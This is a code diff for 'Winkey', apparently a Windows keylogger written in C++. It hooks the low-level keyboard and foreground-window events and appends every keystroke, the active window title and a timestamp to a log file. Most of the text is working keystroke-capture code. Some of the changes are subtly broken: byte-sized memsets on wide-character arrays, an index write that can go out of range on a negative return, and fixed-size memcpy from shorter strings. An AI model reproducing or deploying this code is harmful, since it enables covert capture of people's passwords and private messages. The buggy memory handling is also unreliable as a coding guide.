@@ -1,9 +1,13 @@
 #include "Winkey.hpp"
 
 std::wofstream	Winkey::_logFile;
-wchar_t			Winkey::_windowTitle[256];
+wchar_t			Winkey::_windowTitle[TW_WINTITLE_MAX];
 HWND		    Winkey::_currentWindow;
-std::wstring	Winkey::_keyStroke;
+wchar_t         Winkey::_keyStroke[TW_KEYSTROKE_MAX];
+
+bool Winkey::isPrintable(wchar_t c) {
+    return (c >= 0x20 && (c < 0x7F || c >= 0xA0));
+}
 
 Winkey::Winkey(): _logFileName(TW_LOGFILE) {
     // Prevent multiple instances of this program
@@ -14,6 +18,8 @@ Winkey::Winkey(): _logFileName(TW_LOGFILE) {
     // Open the outfile in appending mode
     _logFile.open(TW_LOGFILE, std::ios::app);
     if (!_logFile.is_open()) throw FileOpenFailureException();
+
+    _logFile.imbue(std::locale(std::locale(), new std::codecvt_utf8<wchar_t>));
 
     // Set window and keyboard hooks
     try { setHooks(); } catch (HookSettingFailureException &e) {
@@ -58,7 +64,7 @@ void Winkey::logToFile() {
         // Converts time_t into a tm structure representing the local time
         //  (hours, minutes, day, month, etc.)
         struct tm   localTime {};
-        if (_windowTitle && localtime_s(&localTime, &now) == 0) {
+        if (localtime_s(&localTime, &now) == 0) {
             // Add log to the logfile `[date time] - 'WINDOW_TITLE'`
             // `L` is for wide characters (Unicode)
             _logFile << L"\n\n[" << std::setfill(L'0')
@@ -84,19 +90,25 @@ void CALLBACK Winkey::winEventProc(
     LONG /*idObject*/, LONG /*idChild*/, DWORD /*dwEventThread*/, DWORD /*dwmsEventTime*/
 )
 {
+    memset(_windowTitle, 0, TW_WINTITLE_MAX);   // Reset _windowTitle
     _currentWindow = hwnd;
     if (event == EVENT_SYSTEM_FOREGROUND) {
-        // We use wide characters (wchar_t) + Unicode (W) version of the function
-        wchar_t windowTitle[256] = {};
-        GetWindowTextW(hwnd, windowTitle, sizeof(windowTitle) / sizeof(wchar_t));
+        wchar_t windowTitle[TW_WINTITLE_MAX] = {};
+        int res = GetWindowTextW(hwnd, windowTitle, sizeof(windowTitle) / sizeof(wchar_t));
 
-        // Sanitize the window title
-        for (size_t i = 0; windowTitle[i] != L'\0'; ++i)
-            if (!isascii(windowTitle[i]))
-                windowTitle[i] = L'?';  // replace non-printable chars
+        if (res > 0) {
+            // Sanitize the window title
+            for (int i = 0; i < res; ++i)
+                if (!isPrintable(windowTitle[i])) windowTitle[i] = L'?';
 
-        // Save the current window title to log it later
-        memcpy(_windowTitle, windowTitle, 256);
+            /*
+            * Save the current window title to log it later
+            *
+            * We will not use the result of GetWindowTextW to determine the length
+            *  as it for some reason did truncate our final string
+            */
+            memcpy(_windowTitle, windowTitle, TW_WINTITLE_MAX);
+        }
     }
 }
 
@@ -144,7 +156,7 @@ LRESULT CALLBACK Winkey::lowLevelKeyboardProc(
         LastVkCode = p->vkCode;
 
         BYTE            keyboardState[256];
-        std::wstring    buffer(5, L'\0');
+        wchar_t         buffer[TW_KEYSTROKE_MAX];
 
         /*
          * Get the current state of all keys
@@ -155,12 +167,14 @@ LRESULT CALLBACK Winkey::lowLevelKeyboardProc(
          * This is why we need to manually update the state of modifier keys
          *  (like Shift, Ctrl, Alt) if we want, for instance, the characters to be
          *  uppercase when Shift is hold.
+         * 
+         * 0x8000 means pressed, 0x0001 means active for toggle keys.
          */
 
         GetKeyboardState(keyboardState);
 
         // Set modifier keys manually
-        if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
+        if (GetAsyncKeyState(VK_SHIFT)  & 0x8000)
             keyboardState[VK_SHIFT] |= 0x80;
         if (GetKeyState(VK_CAPITAL) & 0x0001) // toggle bit, not pressed
             keyboardState[VK_CAPITAL] |= 0x01;
@@ -191,9 +205,10 @@ LRESULT CALLBACK Winkey::lowLevelKeyboardProc(
 
         int result = ToUnicodeEx(
             p->vkCode, p->scanCode, keyboardState,
-            &buffer[0], (int)buffer.size(),
+            buffer, TW_KEYSTROKE_MAX,
             0, layout
         );
+        buffer[result] = L'\0';
 
         /* 
          * Log character to file or, if no valid character was produced
@@ -201,10 +216,13 @@ LRESULT CALLBACK Winkey::lowLevelKeyboardProc(
          *  the virtual key code.
          */
 
-        if (result > 0 && buffer[0] >= 32)
-            _keyStroke = buffer;
-        else
-            _keyStroke = getKeyName(p->vkCode);
+        memset(_keyStroke, 0, TW_KEYSTROKE_MAX);  // Reset keyStroke
+        if (result > 0 && isPrintable(buffer[0]))
+            memcpy(_keyStroke, buffer, TW_KEYSTROKE_MAX);
+        else {
+            std::wstring    keyName = getKeyName(p->vkCode);
+            memcpy(_keyStroke, keyName.c_str(), TW_KEYSTROKE_MAX);
+        }
 
         logToFile();
     }
@@ -219,15 +237,4 @@ Winkey::~Winkey() {
     if (_keyboardHook)          UnhookWindowsHookEx(_keyboardHook);
     if (_singleInstanceMutex)   CloseHandle(_singleInstanceMutex);
     if (_logFile.is_open())     _logFile.close();
-}
-
-int main() {
-    try {
-        Winkey w;
-        w.run();
-    } catch (std::exception &e) {
-        std::cerr << "Error: " << e.what() << std::endl;
-        return 1;
-    }
-    return 0;
 }
